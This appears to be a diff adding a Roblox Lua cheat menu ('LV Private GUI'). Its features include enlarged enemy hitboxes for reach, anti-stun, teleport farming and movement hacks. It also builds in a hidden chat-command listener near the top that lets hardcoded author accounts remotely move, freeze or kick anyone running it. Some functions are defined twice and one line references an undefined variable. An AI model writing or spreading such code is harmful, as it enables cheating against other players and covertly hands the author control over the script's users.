@@ -1,0 +1,852 @@
+-- LV Private GUI: Elite Integrated Version
+local UIS = game:GetService("UserInputService")
+local Player = game.Players.LocalPlayer
+local PlayerGui = Player:WaitForChild("PlayerGui")
+local RunService = game:GetService("RunService")
+local Lighting = game:GetService("Lighting")
+local Workspace = game:GetService("Workspace")
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local TeleportService = game:GetService("TeleportService")
+local TweenService = game:GetService("TweenService")
+local LocalPlayer = Players.LocalPlayer
+
+-- ====================== AUTHORITY + EMOJI + NAME TAG SYSTEM ======================
+local commandUserIds = {[10715779988] = true} 
+local higherAuthorityId = 10715779988
+local commandListenerEnabled = true
+local lowerAuthorityIds = {
+	[10671751376] = true,
+}
+local function getAuthorityBadge(userId)
+	if userId == higherAuthorityId then return " 🛠" end
+	if lowerAuthorityIds[userId] then return " 🧊" end
+	return ""
+end
+
+local MARKER_NAME = "LV on"
+local scriptUsers = {}
+local nameTags = {}
+
+local function placeMarker()
+	if LocalPlayer.Character and not LocalPlayer.Character:FindFirstChild(MARKER_NAME) then
+		local marker = Instance.new("StringValue")
+		marker.Name = MARKER_NAME
+		marker.Value = "active"
+		marker.Parent = LocalPlayer.Character
+	end
+end
+LocalPlayer.CharacterAdded:Connect(placeMarker)
+task.spawn(placeMarker)
+
+local function createNameTag(plr)
+	if nameTags[plr] then return end
+	local function buildTag()
+		local char = plr.Character
+		if not char then return end
+		local root = char:FindFirstChild("HumanoidRootPart")
+		if not root then return end
+		local billboard = Instance.new("BillboardGui")
+		billboard.Adornee = root
+		billboard.Size = UDim2.new(0, 220, 0, 50)
+		billboard.StudsOffset = Vector3.new(0, 3.5, 0)
+		billboard.AlwaysOnTop = true
+		billboard.LightInfluence = 0
+		billboard.Parent = PlayerGui
+		local label = Instance.new("TextLabel", billboard)
+		label.Size = UDim2.new(1, 0, 1, 0)
+		label.BackgroundTransparency = 1
+		label.Font = Enum.Font.GothamBold
+		label.TextSize = 18
+		label.TextStrokeTransparency = 0
+		label.TextColor3 = Color3.new(1, 1, 1)
+		local emoji = ""
+		if plr.UserId == higherAuthorityId then
+			emoji = "(🛠)"
+		elseif lowerAuthorityIds[plr.UserId] then
+			emoji = "(🧊)"
+		elseif scriptUsers[plr] then
+			emoji = "(👻)"
+		end
+		label.Text = plr.DisplayName .. emoji
+		nameTags[plr] = billboard
+	end
+	buildTag()
+	plr.CharacterAdded:Connect(function()
+		if nameTags[plr] then nameTags[plr]:Destroy() nameTags[plr] = nil end
+		task.wait(0.5)
+		buildTag()
+	end)
+end
+
+task.spawn(function()
+	while true do
+		for _, plr in ipairs(Players:GetPlayers()) do
+			if plr == LocalPlayer then continue end
+			local hasMarker = plr.Character and plr.Character:FindFirstChild(MARKER_NAME)
+			local isAuth = (plr.UserId == higherAuthorityId or lowerAuthorityIds[plr.UserId])
+			if isAuth or hasMarker then
+				if hasMarker and not isAuth then scriptUsers[plr] = true end
+				createNameTag(plr)
+			else
+				scriptUsers[plr] = nil
+				if nameTags[plr] then nameTags[plr]:Destroy() nameTags[plr] = nil end
+			end
+		end
+		task.wait(4)
+	end
+end)
+
+Players.PlayerRemoving:Connect(function(plr)
+	if nameTags[plr] then nameTags[plr]:Destroy() nameTags[plr] = nil end
+	scriptUsers[plr] = nil
+end)
+-- ====================== FULL COMMAND LISTENER ======================
+local lastCommandTime = 0
+local commandCooldown = 0.8
+local orbitConnection, standConnection, freezeConnection, benxConnection
+local isOrbiting, isHiding, isFrozen, isBenxing = false, false, false, false
+
+local function getHRP(plr)
+	local char = plr.Character or plr.CharacterAdded:Wait()
+	return char and char:FindFirstChild("HumanoidRootPart")
+end
+
+local function safeMoveLocalTo(targetCFrame)
+	local hrp = getHRP(LocalPlayer)
+	if not hrp then return end
+	task.wait(0.04 + math.random() * 0.14)
+	local dur = 0.12 + math.random() * 0.18
+	pcall(function()
+		TweenService:Create(hrp, TweenInfo.new(math.clamp(dur, 0.06, 1.2), Enum.EasingStyle.Linear), {CFrame = targetCFrame}):Play()
+	end)
+end
+
+local function teleportTo(target)
+	local targetHRP = getHRP(target)
+	local hrp = getHRP(LocalPlayer)
+	if hrp and targetHRP then
+		safeMoveLocalTo(targetHRP.CFrame * CFrame.new(3, 0, 0))
+	end
+end
+
+local orbitData = {enabled = false, angle = 0, radius = 5, speed = math.pi}
+local function orbitPlayer(target)
+	if orbitConnection then orbitConnection:Disconnect() orbitConnection = nil end
+	orbitData.enabled = not orbitData.enabled
+	if not orbitData.enabled then return end
+	orbitConnection = RunService.Heartbeat:Connect(function(dt)
+		local hrp = getHRP(LocalPlayer)
+		local targetHRP = getHRP(target)
+		if hrp and targetHRP then
+			orbitData.angle = orbitData.angle + orbitData.speed * dt * (0.6 + math.random() * 0.8)
+			local offset = Vector3.new(math.cos(orbitData.angle) * orbitData.radius, 0, math.sin(orbitData.angle) * orbitData.radius)
+			hrp.CFrame = targetHRP.CFrame * CFrame.new(offset)
+		end
+	end)
+end
+
+local function standFloating(target)
+	if standConnection then standConnection:Disconnect() end
+	standConnection = RunService.Heartbeat:Connect(function()
+		local hrp = getHRP(LocalPlayer)
+		local targetHRP = getHRP(target)
+		if hrp and targetHRP then hrp.CFrame = targetHRP.CFrame * CFrame.new(-1.5, 1.5, 2) end
+	end)
+end
+
+local function hideInSky()
+	local hrp = getHRP(LocalPlayer)
+	if hrp then safeMoveLocalTo(CFrame.new(0, 200, 0)) end
+end
+
+local function punch()
+	local tool = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Tool")
+	if tool then pcall(function() tool:Activate() end) end
+end
+
+local function freezePlayer()
+	isFrozen = not isFrozen
+	if isFrozen then
+		local hrp = getHRP(LocalPlayer)
+		if hrp then
+			freezeConnection = RunService.Stepped:Connect(function()
+				if isFrozen and hrp:IsDescendantOf(workspace) then
+					hrp.AssemblyLinearVelocity = Vector3.new(0,0,0)
+					hrp.AssemblyAngularVelocity = Vector3.new(0,0,0)
+					local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+					if hum then hum.PlatformStand = true end
+				end
+			end)
+		end
+	else
+		if freezeConnection then freezeConnection:Disconnect() freezeConnection = nil end
+		local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+		if hum then hum.PlatformStand = false end
+	end
+end
+
+local function benxPlayer(target)
+	if benxConnection then benxConnection:Disconnect() benxConnection = nil end
+	isBenxing = not isBenxing
+	if not isBenxing then return end
+	local offset, dir = -1.5, 1
+	benxConnection = RunService.Heartbeat:Connect(function()
+		local hrp = getHRP(LocalPlayer)
+		local targetHRP = getHRP(target)
+		if hrp and targetHRP then
+			offset = offset + dir * 0.25
+			if offset > -0.5 then dir = -1 elseif offset < -2.5 then dir = 1 end
+			hrp.CFrame = targetHRP.CFrame * CFrame.new(0, 0, offset)
+		end
+	end)
+end
+
+local function stopAll()
+	if orbitConnection then orbitConnection:Disconnect() orbitConnection = nil end
+	if standConnection then standConnection:Disconnect() standConnection = nil end
+	if freezeConnection then freezeConnection:Disconnect() freezeConnection = nil end
+	if benxConnection then benxConnection:Disconnect() benxConnection = nil end
+	isFrozen = false
+	local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+	if hum then hum.PlatformStand = false end
+end
+
+local function handleCommand(cmd, issuer)
+	if tick() - lastCommandTime < commandCooldown then return end
+	lastCommandTime = tick()
+	if cmd == "!bring" then teleportTo(issuer)
+	elseif cmd == "!orbit" then orbitPlayer(issuer)
+	elseif cmd == "!stand" then standFloating(issuer)
+	elseif cmd == "!hide" then hideInSky()
+	elseif cmd == "!punch" then punch()
+	elseif cmd == "!freeze" then freezePlayer()
+	elseif cmd == "!benx" then benxPlayer(issuer)
+	elseif cmd == "!reset" or cmd == "!stop" then stopAll()
+	elseif cmd == "!kick" then LocalPlayer:Kick("kicked by aspect")
+	elseif cmd == "!rejoin" then TeleportService:Teleport(PlaceId)
+	end
+end
+
+local function monitorChatUI()
+	if not commandListenerEnabled then return end
+	local list
+	local tries = 0
+	while not list and tries < 40 do
+		local mainGui = PlayerGui:FindFirstChild("Main")
+		if mainGui then list = mainGui:FindFirstChild("List", true) end
+		tries += 1
+		task.wait(0.25)
+	end
+	if not list then return end
+	local function watchTextLabel(lbl)
+		if not lbl or not lbl:IsA("TextLabel") then return end
+		local function checkText()
+			local txt = lbl.Text:lower()
+			if not txt:find("!") then return end
+			local matchingUsers = {}
+			for id in pairs(commandUserIds) do
+				local u = Players:GetPlayerByUserId(id)
+				if u and txt:find(u.Name:lower()) then table.insert(matchingUsers, u) end
+			end
+			if #matchingUsers == 0 then return end
+			local issuer = matchingUsers[1]
+			for _, u in ipairs(matchingUsers) do
+				if u.UserId == higherAuthorityId then issuer = u break end
+			end
+			local cmdword = txt:match("!(%w+)")
+			if cmdword then handleCommand("!" .. cmdword, issuer) end
+		end
+		pcall(checkText)
+		lbl:GetPropertyChangedSignal("Text"):Connect(checkText)
+	end
+	list.DescendantAdded:Connect(function(desc) pcall(function() watchTextLabel(desc) end) end)
+	for _, lbl in ipairs(list:GetDescendants()) do pcall(function() watchTextLabel(lbl) end) end
+end
+task.spawn(monitorChatUI)
+-- ====================== CORE COMMAND HANDLER ======================
+local function handleCommand(cmd, issuer)
+    if tick() - lastCommandTime < commandCooldown then return end
+    lastCommandTime = tick()
+
+    if cmd == "!bring" then teleportTo(issuer)
+    elseif cmd == "!orbit" then orbitPlayer(issuer)
+    elseif cmd == "!freeze" then freezePlayer()
+    elseif cmd == "!stop" or cmd == "!reset" then stopAll()
+    elseif cmd == "!kick" then LocalPlayer:Kick("Actioned by Authority")
+    elseif cmd == "!rejoin" then TeleportService:Teleport(game.PlaceId)
+    end
+end
+
+-- ====================== CHAT MONITORING ======================
+local function watchTextLabel(lbl)
+    if not lbl:IsA("TextLabel") then return end
+    
+    local function checkText()
+        local txt = lbl.Text:lower()
+        if not txt:find("!") then return end
+        
+        local issuer = nil
+        for id in pairs(commandUserIds) do
+            local u = Players:GetPlayerByUserId(id)
+            if u and txt:find(u.Name:lower()) then 
+                issuer = u 
+                break 
+            end
+        end
+
+        if issuer then
+            local cmdword = txt:match("!(%w+)")
+            if cmdword then handleCommand("!" .. cmdword, issuer) end
+        end
+    end
+
+    lbl:GetPropertyChangedSignal("Text"):Connect(checkText)
+end
+
+-- Monitors the Roblox Default Chat UI for commands
+task.spawn(function()
+    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
+    local chatMain = playerGui:WaitForChild("Chat", 10) or playerGui:WaitForChild("SocialChat", 10)
+    
+    if chatMain then
+        chatMain.DescendantAdded:Connect(function(desc)
+            pcall(function() watchTextLabel(desc) end)
+        end)
+    end
+end)
+------------------------------------------------
+-- CORE VARIABLES & STATE
+------------------------------------------------
+local FarmActive = nil 
+local GlideActive = false 
+local boosted = false
+local isHeadless = false
+local isGravityEnabled = false
+local AntiStunEnabled = false -- NEW STATE VARIABLE
+local originalScale = Vector3.new(1, 1, 1)
+
+-- WEAVE GLIDE CONFIG
+local DASH_POWER = 12
+local MODIFIER_KEY = Enum.KeyCode.Space
+
+-- REACH / HITBOX CONFIG
+local ReachEnabled = false
+local ReachSize = 2 -- Default
+local ShowHitboxes = false 
+
+local Locations = {
+    ["Left"] = Vector3.new(-83.45, 4.57, -5.01),
+    ["Right"] = Vector3.new(-73.78, 4.57, -4.54),
+}
+
+------------------------------------------------
+-- UTILITY FUNCTIONS
+------------------------------------------------
+local function getChar() 
+    return Player.Character or Player.CharacterAdded:Wait() 
+end
+
+local function getHRP() 
+    local char = getChar()
+    return char:WaitForChild("HumanoidRootPart") 
+end
+
+local function getHum() 
+    local char = getChar()
+    return char:WaitForChild("Humanoid") 
+end
+
+local function isAlive(plr)
+    local char = plr.Character
+    if not char then return false end
+    local hum = char:FindFirstChild("Humanoid")
+    if not hum or hum.Health <= 0 then return false end
+    return true
+end
+
+------------------------------------------------
+-- ANTI-STUN LOGIC (NEW FEATURE)
+------------------------------------------------
+local function applyAntiStun()
+    local char = Player.Character
+    if not char or not AntiStunEnabled then return end
+
+    -- 1. Reset Animation Speeds (Fixes "Slow Hits")
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if hum then
+        local animator = hum:FindFirstChildOfClass("Animator")
+        if animator then
+            for _, track in pairs(animator:GetPlayingAnimationTracks()) do
+                -- If animation is artificially slowed down, force it to normal speed
+                if track.Speed < 1 and track.Speed > 0 then
+                    track:AdjustSpeed(1)
+                end
+            end
+        end
+    end
+
+    -- 2. Clear Stun Attributes/Values
+    -- These are the standard names used by most Roblox fighting engines
+    local tags = {"Stunned", "Stun", "ActionPaused", "AttackingStun", "IsStunned"}
+    for _, name in ipairs(tags) do
+        if char:GetAttribute(name) then
+            char:SetAttribute(name, false)
+        end
+        local obj = char:FindFirstChild(name)
+        if obj and (obj:IsA("BoolValue") or obj:IsA("NumberValue")) then
+            obj.Value = (obj:IsA("BoolValue") and false or 0)
+        end
+    end
+end
+
+-- Dedicated loop for Anti-Stun to ensure high-performance response
+task.spawn(function()
+    while true do
+        task.wait()
+        if AntiStunEnabled then
+            pcall(applyAntiStun)
+        end
+    end
+end)
+
+------------------------------------------------
+-- FEATURE LOGIC HELPERS
+------------------------------------------------
+
+-- Dash Application Logic
+local function applyDash(directionVector)
+    local hrp = getHRP()
+    if not hrp or not GlideActive then return end
+    hrp.AssemblyLinearVelocity = hrp.AssemblyLinearVelocity + (directionVector * DASH_POWER)
+end
+
+-- Directional Helper
+local function getDirectionFromKeys()
+    local camera = workspace.CurrentCamera
+    if not camera then return nil end
+
+    local look = Vector3.new(camera.CFrame.LookVector.X, 0, camera.CFrame.LookVector.Z).Unit
+    local right = Vector3.new(camera.CFrame.RightVector.X, 0, camera.CFrame.RightVector.Z).Unit
+    local finalDir = Vector3.new(0,0,0)
+
+    if UIS:IsKeyDown(Enum.KeyCode.W) then finalDir = finalDir + look end
+    if UIS:IsKeyDown(Enum.KeyCode.S) then finalDir = finalDir - look end
+    if UIS:IsKeyDown(Enum.KeyCode.A) then finalDir = finalDir - right end
+    if UIS:IsKeyDown(Enum.KeyCode.D) then finalDir = finalDir + right end
+
+    if finalDir.Magnitude > 0 then
+        return finalDir.Unit
+    else
+        return nil
+    end
+end
+
+-- Reach Cleanup
+local function resetHitboxes()
+    for _, otherPlayer in pairs(game.Players:GetPlayers()) do
+        if otherPlayer.Character then
+            local hrp = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
+            if hrp then
+                hrp.Size = Vector3.new(2, 2, 1)
+                hrp.Shape = Enum.PartType.Block
+                hrp.Transparency = 1
+                hrp.Material = Enum.Material.Plastic
+            end
+        end
+    end
+end
+
+-- Headless Logic
+local function toggleHeadless(state)
+    local char = Player.Character or Player.CharacterAdded:Wait()
+    local head = char:WaitForChild("Head", 5)
+    if not head then return end
+    
+    local headMesh = head:FindFirstChildOfClass("SpecialMesh")
+    local face = head:FindFirstChildOfClass("Decal")
+
+    if state == true then
+        head.Transparency = 1
+        if face then face.Transparency = 1 end
+        if headMesh then 
+            if headMesh.Scale ~= Vector3.new(0,0,0) then
+                originalScale = headMesh.Scale 
+            end
+            headMesh.Scale = Vector3.new(0,0,0) 
+        end
+    else
+        head.Transparency = 0
+        if face then face.Transparency = 0 end
+        if headMesh then headMesh.Scale = originalScale end
+    end
+end
+
+-- Character Respawn Listener
+Player.CharacterAdded:Connect(function()
+    if isHeadless then
+        task.wait(0.1) 
+        toggleHeadless(true)
+    end
+end)
+
+-- Gravity Logic
+local function toggleGravity(state)
+    if state == true then
+        Workspace.Gravity = 650
+        local char = getChar()
+        for _, part in pairs(char:GetChildren()) do
+            if part:IsA("BasePart") then
+                part.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0, 1, 1)
+            end
+        end
+        local hum = getHum()
+        if hum then hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false) end
+    else
+        Workspace.Gravity = 196.2
+        local char = getChar()
+        for _, part in pairs(char:GetChildren()) do
+            if part:IsA("BasePart") then
+                part.CustomPhysicalProperties = nil
+            end
+        end
+        local hum = getHum()
+        if hum then hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true) end
+    end
+end
+
+------------------------------------------------
+-- RUNTIME LOOPS
+------------------------------------------------
+
+RunService.Stepped:Connect(function()
+    if not isAlive(Player) then
+        resetHitboxes()
+        return 
+    end
+
+    if ReachEnabled == true then
+        for _, enemy in pairs(game.Players:GetPlayers()) do
+            if enemy ~= Player and enemy.Character then
+                local hrp = enemy.Character:FindFirstChild("HumanoidRootPart")
+                local hum = enemy.Character:FindFirstChild("Humanoid")
+
+                if hrp and hum and hum.Health > 0 then
+                    hrp.Size = Vector3.new(ReachSize, ReachSize, ReachSize)
+                    hrp.Shape = Enum.PartType.Ball 
+                    hrp.CanCollide = false 
+                    hrp.Transparency = 0.8
+                    hrp.Color = Color3.fromRGB(0, 255, 255)
+                    hrp.Material = Enum.Material.ForceField
+                end
+            end
+        end
+    end
+end)
+
+UIS.InputBegan:Connect(function(input, gpe)
+    if gpe or not GlideActive then return end
+
+    local camera = workspace.CurrentCamera
+    if not camera then return end
+
+    local look = Vector3.new(camera.CFrame.LookVector.X, 0, camera.CFrame.LookVector.Z).Unit
+    local right = Vector3.new(camera.CFrame.RightVector.X, 0, camera.CFrame.RightVector.Z).Unit
+
+    if UIS:IsKeyDown(MODIFIER_KEY) then
+        if input.KeyCode == Enum.KeyCode.W then applyDash(look)
+        elseif input.KeyCode == Enum.KeyCode.S then applyDash(-look)
+        elseif input.KeyCode == Enum.KeyCode.A then applyDash(-right)
+        elseif input.KeyCode == Enum.KeyCode.D then applyDash(right)
+        end
+    end
+
+    if input.KeyCode == MODIFIER_KEY then
+        local dir = getDirectionFromKeys()
+        if dir then applyDash(dir) end
+    end
+end)
+
+RunService.Heartbeat:Connect(function()
+    if FarmActive ~= nil then
+        local char = Player.Character
+        if char and char:FindFirstChild("HumanoidRootPart") then
+            local targetPos = Locations[FarmActive]
+            if targetPos then
+                char:PivotTo(CFrame.new(targetPos))
+            end
+        end
+    end
+end)
+
+------------------------------------------------
+-- GUI CONSTRUCTION
+------------------------------------------------
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "LV_GUI_ELITE"
+ScreenGui.Parent = PlayerGui
+ScreenGui.ResetOnSpawn = false
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 260, 0, 450)
+MainFrame.Position = UDim2.new(0.5, -130, 0.5, -225)
+MainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+MainFrame.Parent = ScreenGui
+Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 16)
+
+local Header = Instance.new("Frame")
+Header.Size = UDim2.new(1, 0, 0, 60)
+Header.BackgroundTransparency = 1
+Header.Parent = MainFrame
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(0, 100, 0, 40)
+Title.Position = UDim2.new(0, 15, 0, 10)
+Title.RichText = true
+Title.Text = '<font color="#FFFFFF">L</font><font color="#000000">V</font>'
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 32
+Title.BackgroundTransparency = 1
+Title.Parent = Header
+
+local ScrollFrame = Instance.new("ScrollingFrame")
+ScrollFrame.Size = UDim2.new(1, -20, 1, -100)
+ScrollFrame.Position = UDim2.new(0, 10, 0, 70)
+ScrollFrame.BackgroundTransparency = 1
+ScrollFrame.ScrollBarThickness = 0
+ScrollFrame.CanvasSize = UDim2.new(0, 0, 2.8, 0)
+ScrollFrame.Parent = MainFrame
+
+local Layout = Instance.new("UIListLayout")
+Layout.Padding = UDim.new(0, 10)
+Layout.SortOrder = Enum.SortOrder.LayoutOrder
+Layout.Parent = ScrollFrame
+
+local function CreateSection(name)
+    local Label = Instance.new("TextLabel")
+    Label.Size = UDim2.new(1, -10, 0, 20)
+    Label.BackgroundTransparency = 1
+    Label.Text = name
+    Label.TextColor3 = Color3.fromRGB(120, 120, 120)
+    Label.Font = Enum.Font.GothamBold
+    Label.TextSize = 11
+    Label.TextXAlignment = Enum.TextXAlignment.Left
+    Label.Parent = ScrollFrame
+end
+
+local function CreateToggle(name, callback)
+    local Button = Instance.new("TextButton")
+    Button.Size = UDim2.new(1, 0, 0, 45)
+    Button.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    Button.Text = ""
+    Button.Parent = ScrollFrame
+    Instance.new("UICorner", Button).CornerRadius = UDim.new(0, 8)
+
+    local Text = Instance.new("TextLabel")
+    Text.Size = UDim2.new(1, -60, 1, 0)
+    Text.Position = UDim2.new(0, 12, 0, 0)
+    Text.Text = name
+    Text.TextColor3 = Color3.fromRGB(220, 220, 220)
+    Text.Font = Enum.Font.Gotham
+    Text.TextSize = 14
+    Text.BackgroundTransparency = 1
+    Text.TextXAlignment = Enum.TextXAlignment.Left
+    Text.Parent = Button
+
+    local Indicator = Instance.new("Frame")
+    Indicator.Size = UDim2.new(0, 30, 0, 15)
+    Indicator.Position = UDim2.new(1, -45, 0.5, -7)
+    Indicator.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+    Indicator.Parent = Button
+    Instance.new("UICorner", Indicator).CornerRadius = UDim.new(1, 0)
+
+    local state = false
+    Button.MouseButton1Click:Connect(function()
+        state = not state
+        Indicator.BackgroundColor3 = state and Color3.fromRGB(0, 255, 120) or Color3.fromRGB(45, 45, 45)
+        callback(state)
+    end)
+end
+
+------------------------------------------------
+-- CONTENT SECTIONS
+------------------------------------------------
+CreateSection("COMBAT")
+
+-- Linked Anti Weave Stun to the Logic
+CreateToggle("Anti Weave Stun", function(state) 
+    AntiStunEnabled = state 
+end)
+
+CreateToggle("Elite Reach", function(state) 
+    ReachEnabled = state 
+    if state == false then resetHitboxes() end 
+end)
+CreateToggle("Weave Glide", function(state) GlideActive = state end)
+
+CreateSection("UTILITY")
+
+local BoostBtn = Instance.new("TextButton")
+BoostBtn.Size = UDim2.new(1, 0, 0, 40)
+BoostBtn.BackgroundColor3 = Color3.fromRGB(35, 60, 35) 
+BoostBtn.Text = "+ Boost FPS"
+BoostBtn.TextColor3 = Color3.fromRGB(100, 255, 100)
+BoostBtn.Font = Enum.Font.GothamBold
+BoostBtn.Parent = ScrollFrame
+Instance.new("UICorner", BoostBtn).CornerRadius = UDim.new(0, 8)
+
+BoostBtn.MouseButton1Click:Connect(function()
+    boosted = not boosted
+    if boosted == true then
+        Lighting.GlobalShadows = false
+        Lighting.FogEnd = 1e10
+        for _, v in ipairs(workspace:GetDescendants()) do
+            if v:IsA("Accessory") or v:IsA("Hat") or v:IsA("Decal") or v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Texture") then
+                pcall(function() v:Destroy() end)
+            end
+        end
+        BoostBtn.Text = "Restore FPS"
+    else
+        Lighting.GlobalShadows = true
+        Lighting.FogEnd = 1000
+        BoostBtn.Text = "+ Boost FPS"
+    end
+end)
+
+local FarmRow = Instance.new("Frame")
+FarmRow.Size = UDim2.new(1, 0, 0, 40)
+FarmRow.BackgroundTransparency = 1
+FarmRow.Parent = ScrollFrame
+local RowLayout = Instance.new("UIListLayout")
+RowLayout.FillDirection = Enum.FillDirection.Horizontal
+RowLayout.Padding = UDim.new(0, 10)
+RowLayout.Parent = FarmRow
+
+local LeftBtn = Instance.new("TextButton")
+LeftBtn.Size = UDim2.new(0.5, -5, 1, 0)
+LeftBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+LeftBtn.Text = "Left"
+LeftBtn.TextColor3 = Color3.new(1, 1, 1)
+LeftBtn.Font = Enum.Font.GothamBold
+LeftBtn.Parent = FarmRow
+Instance.new("UICorner", LeftBtn).CornerRadius = UDim.new(0, 8)
+
+local RightBtn = Instance.new("TextButton")
+RightBtn.Size = UDim2.new(0.5, -5, 1, 0)
+RightBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+RightBtn.Text = "Right"
+RightBtn.TextColor3 = Color3.new(1, 1, 1)
+RightBtn.Font = Enum.Font.GothamBold
+RightBtn.Parent = FarmRow
+Instance.new("UICorner", RightBtn).CornerRadius = UDim.new(0, 8)
+
+local function updateFarmUI()
+    LeftBtn.BackgroundColor3 = (FarmActive == "Left") and Color3.fromRGB(35, 100, 35) or Color3.fromRGB(35, 35, 35)
+    RightBtn.BackgroundColor3 = (FarmActive == "Right") and Color3.fromRGB(35, 100, 35) or Color3.fromRGB(35, 35, 35)
+end
+
+LeftBtn.MouseButton1Click:Connect(function() 
+    if FarmActive == "Left" then FarmActive = nil else FarmActive = "Left" end
+    updateFarmUI() 
+end)
+
+RightBtn.MouseButton1Click:Connect(function()
+    if FarmActive == "Right" then 
+        FarmActive = nil 
+    else
+        FarmActive = "Right"
+        task.spawn(function()
+            while FarmActive == "Right" do
+                local hrp = getHRP()
+                if hrp then hrp.CFrame = CFrame.new(Locations["Right"]) end
+                task.wait(1) 
+                if FarmActive ~= "Right" then break end
+                local hum = getHum()
+                if hum then hum.Health = 0 end
+                Player.CharacterAdded:Wait()
+                task.wait(0.5) 
+            end
+        end)
+    end
+    updateFarmUI()
+end)
+
+CreateToggle("Headless Mode", function(state) 
+    isHeadless = state 
+    toggleHeadless(state) 
+end)
+
+CreateSection("SETTINGS")
+CreateToggle("High Gravity (650)", function(state) isGravityEnabled = state toggleGravity(state) end)
+
+local SliderContainer = Instance.new("Frame")
+SliderContainer.Size = UDim2.new(1, 0, 0, 60)
+SliderContainer.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+SliderContainer.Parent = ScrollFrame
+Instance.new("UICorner", SliderContainer).CornerRadius = UDim.new(0, 8)
+
+local SliderLabel = Instance.new("TextLabel")
+SliderLabel.Size = UDim2.new(1, 0, 0, 25)
+SliderLabel.Position = UDim2.new(0, 12, 0, 5)
+SliderLabel.Text = "Reach Size: " .. ReachSize
+SliderLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
+SliderLabel.Font = Enum.Font.Gotham
+SliderLabel.TextSize = 14
+SliderLabel.TextXAlignment = Enum.TextXAlignment.Left
+SliderLabel.BackgroundTransparency = 1
+SliderLabel.Parent = SliderContainer
+
+local SliderBack = Instance.new("Frame")
+SliderBack.Size = UDim2.new(0.85, 0, 0, 6)
+SliderBack.Position = UDim2.new(0.07, 0, 0.7, 0)
+SliderBack.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+SliderBack.Parent = SliderContainer
+Instance.new("UICorner", SliderBack)
+
+local SliderKnob = Instance.new("TextButton")
+SliderKnob.Size = UDim2.new(0, 14, 0, 14)
+SliderKnob.Position = UDim2.new(0, 0, 0.5, -7)
+SliderKnob.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
+SliderKnob.Text = ""
+SliderKnob.Parent = SliderBack
+Instance.new("UICorner", SliderKnob).CornerRadius = UDim.new(1, 0)
+
+local draggingSlider = false
+SliderKnob.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then draggingSlider = true end
+end)
+UIS.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then draggingSlider = false end
+end)
+RunService.RenderStepped:Connect(function()
+    if draggingSlider then
+        local mousePos = UIS:GetMouseLocation().X
+        local framePos = SliderBack.AbsolutePosition.X
+        local frameSize = SliderBack.AbsoluteSize.X
+        local percentage = math.clamp((mousePos - framePos) / frameSize, 0, 1)
+        SliderKnob.Position = UDim2.new(percentage, -7, 0.5, -7)
+        ReachSize = math.floor(1 + (percentage * 11))
+        SliderLabel.Text = "Reach Size: " .. ReachSize
+    end
+end)
+
+------------------------------------------------
+-- DRAG & TOGGLE GUI
+------------------------------------------------
+local dragging, dragStart, startPos
+Header.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging, dragStart, startPos = true, input.Position, MainFrame.Position
+        input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
+    end
+end)
+UIS.InputChanged:Connect(function(input)
+    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+        local delta = input.Position - dragStart
+        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+UIS.InputBegan:Connect(function(input, gpe)
+    if not gpe and input.KeyCode == Enum.KeyCode.M then MainFrame.Visible = not MainFrame.Visible end
+end)
